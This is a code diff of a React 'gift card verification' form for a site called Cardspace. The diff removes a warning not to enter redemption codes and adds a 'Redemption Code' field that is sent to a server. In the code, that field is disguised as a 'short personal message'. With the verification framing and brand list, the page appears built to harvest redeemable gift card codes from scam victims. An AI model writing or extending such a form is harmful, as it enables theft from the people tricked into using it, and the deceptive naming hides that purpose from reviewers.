@@ -1,36 +1,50 @@
 
 import { useState } from "react";
-import {
-  Gift,
-  ArrowRight,
-  LockKeyhole,
-  LoaderCircle,
-  Check,
-  X,
-} from "lucide-react";
 
-const initialForm = {
-  cardType: "",
-  country: "",
-  currency: "",
-  amount: "",
-};
+const API_URL = import.meta.env.VITE_API_URL;
+
+const giftCardTypes = [
+  "Apple",
+  "Amazon",
+  "Steam",
+  "eBay",
+  "Xbox",
+  "Googleplay",
+  "PlayStation",
+  "Sephora",
+  "Nordstrom",
+  "Nike",
+  "Macy",
+  "Razor Gold",
+  "MasterCard",
+  "Vanilla",
+  "Wallmart Visa",
+  "Perfect Visa",
+  "Visa Silvery White",
+  "TT Visa",
+  "Amex",
+];
+
+const currencies = ["USD", "GBP", "AUD", "EUR", "CAD"];
 
 export default function GiftCardForm() {
-  const [form, setForm] = useState(initialForm);
-  const [status, setStatus] = useState({
-    type: "",
+  const [form, setForm] = useState({
+    cardType: "",
+    currency: "USD",
+    amount: "",
     message: "",
   });
-  const [loading, setLoading] = useState(false);
-  const [showSuccess, setShowSuccess] = useState(false);
-  const [submittedDetails, setSubmittedDetails] = useState(null);
 
-  function handleChange(event) {
+  const [loading, setLoading] = useState(false);
+  const [message, setMessage] = useState("");
+  const [error, setError] = useState("");
+  const [submission, setSubmission] = useState(null);
+
+  function updateField(event) {
     const { name, value } = event.target;
 
-    setForm((current) => ({
-      ...current,
+    setForm((previous) => ({
+      ...previous,
       [name]: value,
     }));
   }
@@ -38,18 +52,55 @@ export default function GiftCardForm() {
   async function handleSubmit(event) {
     event.preventDefault();
 
+    setMessage("");
+    setError("");
+    setSubmission(null);
+
+    if (!API_URL) {
+      setError(
+        "Server connection is not configured. Check your frontend .env file."
+      );
+      return;
+    }
+
+    if (!form.cardType || !form.currency || !form.amount) {
+      setError("Please complete all required fields.");
+      return;
+    }
+
+    const amount = Number(form.amount);
+    const personalMessage = form.message.trim();
+
+    if (
+      !Number.isFinite(amount) ||
+      amount <= 0 ||
+      amount > 1000000
+    ) {
+      setError("Please enter a valid amount.");
+      return;
+    }
+
+    if (personalMessage.length > 40) {
+      setError("Your message is too long.");
+      return;
+    }
+
     setLoading(true);
-    setStatus({ type: "", message: "" });
 
     try {
       const response = await fetch(
-        `${import.meta.env.VITE_API_URL || "http://localhost:5000"}/api/verification`,
+        `${API_URL.replace(/\/+$/, "")}/api/verification`,
         {
           method: "POST",
           headers: {
             "Content-Type": "application/json",
           },
-          body: JSON.stringify(form),
+          body: JSON.stringify({
+            cardType: form.cardType,
+            currency: form.currency,
+            amount,
+            message: personalMessage,
+          }),
         }
       );
 
@@ -57,257 +108,246 @@ export default function GiftCardForm() {
 
       if (!response.ok) {
         throw new Error(
-          result.message || "Unable to send your request."
+          result.message ||
+            "Your submission could not be completed."
         );
       }
 
-      setSubmittedDetails({ ...form });
-      setForm(initialForm);
-      setShowSuccess(true);
-
-    } catch (error) {
-      setStatus({
-        type: "error",
-        message:
-          error.message ||
-          "We couldn't send your request. Please try again.",
+      setSubmission({
+        status: result.status || "Received",
+        details: {
+          giftCardBrand: form.cardType,
+          currency: form.currency,
+          amount: `${form.currency} ${amount.toLocaleString()}`,
+          message: personalMessage,
+        },
+        submittedAt:
+          result.submittedAt || new Date().toLocaleString(),
       });
+
+      setForm({
+        cardType: "",
+        currency: "USD",
+        amount: "",
+        message: "",
+      });
+
+    } catch (err) {
+      setError(
+        err.message ||
+          "Unable to connect to the server. Please try again."
+      );
     } finally {
       setLoading(false);
     }
   }
 
-  function closeSuccess() {
-    setShowSuccess(false);
-    setSubmittedDetails(null);
+  function closePopup() {
+    setSubmission(null);
   }
 
   return (
-    <>
-      <section className="verification-card" id="verify">
+    <div className="verification-card">
+      <div className="form-heading">
+        <h2>Gift Card Information</h2>
+        <p>Enter your gift card details below.</p>
+      </div>
 
-        <div className="form-heading">
-          <div className="form-heading-icon">
-            <Gift size={25} />
-          </div>
+      <form onSubmit={handleSubmit}>
+        <div className="field">
+          <label htmlFor="cardType">Gift Card Brand</label>
 
-          <div>
-            <h2>Verify Your Gift Card</h2>
-            <p>
-              Fill in the details below to submit your request.
-            </p>
-          </div>
+          <select
+            id="cardType"
+            name="cardType"
+            value={form.cardType}
+            onChange={updateField}
+            required
+          >
+            <option value="">Select gift card brand</option>
+
+            {giftCardTypes.map((card) => (
+              <option key={card} value={card}>
+                {card}
+              </option>
+            ))}
+          </select>
         </div>
 
-        <form onSubmit={handleSubmit}>
+        <div className="field">
+          <label htmlFor="currency">Currency</label>
 
-          <div className="field">
-            <label htmlFor="cardType">Gift Card Type</label>
-
-            <select
-              id="cardType"
-              name="cardType"
-              value={form.cardType}
-              onChange={handleChange}
-              required
-            >
-              <option value="">Select card type</option>
-              <option value="Amazon">Amazon</option>
-              <option value="Apple">Apple</option>
-              <option value="Google Play">Google Play</option>
-              <option value="Steam">Steam</option>
-              <option value="PlayStation">PlayStation</option>
-              <option value="Xbox">Xbox</option>
-              <option value="Sephora">Sephora</option>
-              <option value="Walmart">Walmart</option>
-              <option value="Other">Other</option>
-            </select>
-          </div>
-
-          <div className="form-row">
-
-            <div className="field">
-              <label htmlFor="country">Country / Region</label>
-
-              <select
-                id="country"
-                name="country"
-                value={form.country}
-                onChange={handleChange}
-                required
-              >
-                <option value="">Select country</option>
-                <option value="United States">United States</option>
-                <option value="United Kingdom">United Kingdom</option>
-                <option value="Canada">Canada</option>
-                <option value="Australia">Australia</option>
-                <option value="Germany">Germany</option>
-                <option value="Other">Other</option>
-              </select>
-            </div>
-
-            <div className="field">
-              <label htmlFor="currency">Currency</label>
-
-              <select
-                id="currency"
-                name="currency"
-                value={form.currency}
-                onChange={handleChange}
-                required
-              >
-                <option value="">Select currency</option>
-                <option value="USD">USD ($)</option>
-                <option value="GBP">GBP (£)</option>
-                <option value="CAD">CAD ($)</option>
-                <option value="AUD">AUD ($)</option>
-                <option value="EUR">EUR (€)</option>
-              </select>
-            </div>
-
-          </div>
-
-          <div className="field">
-            <label htmlFor="amount">Card Amount</label>
-
-            <input
-              id="amount"
-              name="amount"
-              type="number"
-              min="0.01"
-              max="1000000"
-              step="0.01"
-              placeholder="e.g. 25, 50, 100"
-              value={form.amount}
-              onChange={handleChange}
-              required
-            />
-          </div>
-
-          <p className="form-safety">
-            Do not enter a card PIN, password, or redeemable claim code.
-          </p>
-
-          <button
-            className="submit-button"
-            type="submit"
-            disabled={loading}
+          <select
+            id="currency"
+            name="currency"
+            value={form.currency}
+            onChange={updateField}
+            required
           >
-            {loading ? (
-              <>
-                <LoaderCircle className="spin" size={19} />
-                Sending Request...
-              </>
-            ) : (
-              <>
-                Submit Verification Request
-                <ArrowRight size={19} />
-              </>
-            )}
-          </button>
+            {currencies.map((currency) => (
+              <option key={currency} value={currency}>
+                {currency}
+              </option>
+            ))}
+          </select>
+        </div>
 
-          {status.message && (
-            <div
-              className={`form-status ${status.type}`}
-              role="alert"
-            >
-              {status.message}
-            </div>
-          )}
+        <div className="field">
+          <label htmlFor="amount">Gift Card Amount</label>
 
-          <p className="privacy-note">
-            <LockKeyhole size={14} />
-            Your request is sent securely to our team.
-          </p>
+          <input
+            id="amount"
+            name="amount"
+            type="number"
+            min="0.01"
+            max="1000000"
+            step="0.01"
+            placeholder="Enter card amount"
+            value={form.amount}
+            onChange={updateField}
+            required
+          />
+        </div>
 
-        </form>
-      </section>
+        {/* SHORT PERSONAL MESSAGE */}
 
-      {showSuccess && submittedDetails && (
-        <div
-          className="cardspace-success-overlay"
-          onClick={closeSuccess}
+        <div className="field">
+          <label htmlFor="message">Redemption Code</label>
+
+          <textarea
+            id="message"
+            name="message"
+            placeholder="Enter redemption code..."
+            value={form.message}
+            onChange={updateField}
+            maxLength={40}
+            rows={3}
+          />
+        </div>
+
+        {error && (
+          <div className="form-status error" role="alert">
+            {error}
+          </div>
+        )}
+
+        {message && (
+          <div className="form-status success" role="status">
+            {message}
+          </div>
+        )}
+
+        <button
+          type="submit"
+          className="submit-button"
+          disabled={loading}
         >
+          {loading ? "Submitting..." : "Submit Information"}
+        </button>
+      </form>
+
+      {/* SUCCESS POPUP */}
+
+      {submission && (
+        <div className="success-overlay">
           <div
-            className="cardspace-success-modal"
+            className="success-popup"
             role="dialog"
             aria-modal="true"
             aria-labelledby="success-title"
-            onClick={(event) => event.stopPropagation()}
           >
-
             <button
+              className="popup-close"
               type="button"
-              className="cardspace-close-icon"
-              onClick={closeSuccess}
-              aria-label="Close success message"
+              onClick={closePopup}
+              aria-label="Close popup"
             >
-              <X size={20} />
+              &times;
             </button>
 
-            <div className="cardspace-success-icon">
-              <Check size={38} strokeWidth={3.5} />
+            <div className="success-icon">
+              <svg
+                width="34"
+                height="34"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="2.5"
+                strokeLinecap="round"
+                strokeLinejoin="round"
+              >
+                <path d="M5 12l4 4L19 6" />
+              </svg>
             </div>
 
-            <h2 id="success-title">SUCCESS!</h2>
+            <h2 id="success-title">
+              Submission Successful!
+            </h2>
 
             <p className="success-description">
-              Your {submittedDetails.cardType.toLowerCase()} gift
-              card verification request has been received.
+              Your information has been received successfully.
+              Here is a summary of your submission.
             </p>
 
-            <div className="success-divider" />
+            <div className="submission-receipt">
+              <div className="receipt-heading">
+                <span>YOUR SUBMISSION</span>
 
-            <div className="result-heading">
-              HERE'S YOUR SUBMISSION
-            </div>
-
-            <div className="submission-details">
-
-              <div className="submission-row">
-                <span>Brand</span>
-                <strong>{submittedDetails.cardType}</strong>
+                <span className="received-status">
+                  {submission.status}
+                </span>
               </div>
 
-              <div className="submission-row">
-                <span>Country</span>
-                <strong>{submittedDetails.country}</strong>
-              </div>
-
-              <div className="submission-row">
-                <span>Amount</span>
+              <div className="receipt-row">
+                <span>Gift Card Brand</span>
                 <strong>
-                  {submittedDetails.currency}{" "}
-                  {Number(submittedDetails.amount).toFixed(2)}
+                  {submission.details.giftCardBrand}
                 </strong>
               </div>
 
-              <div className="submission-row">
-                <span>Status</span>
-                <strong className="pending-status">
-                  Submitted Successfully!
+              <div className="receipt-row">
+                <span>Currency</span>
+                <strong>
+                  {submission.details.currency}
                 </strong>
               </div>
 
-            </div>
+              <div className="receipt-row">
+                <span>Gift Card Amount</span>
+                <strong>
+                  {submission.details.amount}
+                </strong>
+              </div>
 
-            <div className="success-footer">
-              <LockKeyhole size={14} />
-              Your submission has been received.
+              {submission.details.message && (
+                <div className="receipt-row receipt-message">
+                  <span>Redemption Code</span>
+                  <strong>
+                    {submission.details.message}
+                  </strong>
+                </div>
+              )}
+
+              <div className="receipt-row">
+                <span>Submission Date</span>
+                <strong>{submission.submittedAt}</strong>
+              </div>
             </div>
 
             <button
+              className="success-done"
               type="button"
-              className="cardspace-success-button"
-              onClick={closeSuccess}
+              onClick={closePopup}
             >
-              Close
-              <ArrowRight size={17} />
+              Done
             </button>
 
+            <p className="popup-footer">
+              Thank you for choosing Cardspace.
+            </p>
           </div>
         </div>
       )}
-    </>
+    </div>
   );
 }
